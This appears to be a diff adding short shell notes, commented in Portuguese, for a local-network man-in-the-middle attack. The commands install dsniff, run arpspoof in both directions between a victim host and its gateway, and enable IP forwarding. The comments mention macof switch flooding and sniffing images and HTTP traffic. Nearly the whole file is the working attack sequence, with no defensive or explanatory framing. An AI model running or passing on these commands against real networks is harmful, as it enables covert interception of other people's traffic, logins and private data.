@@ -1,0 +1,11 @@
+# primeiro vamos instalar o pacote dsniff
+
+apt-get install dsniff
+
+arpspoof -i wlx00e04d01db32 -t 192.168.2.113 192.168.2.1
+arpspoof -i wlx00e04d01db32 -t 192.168.2.1 192.168.2.113
+
+# usar o macof para switch
+echo “1” > /proc/sys/net/ipv4/ip_forward
+# snifar imagens
+# snifar http
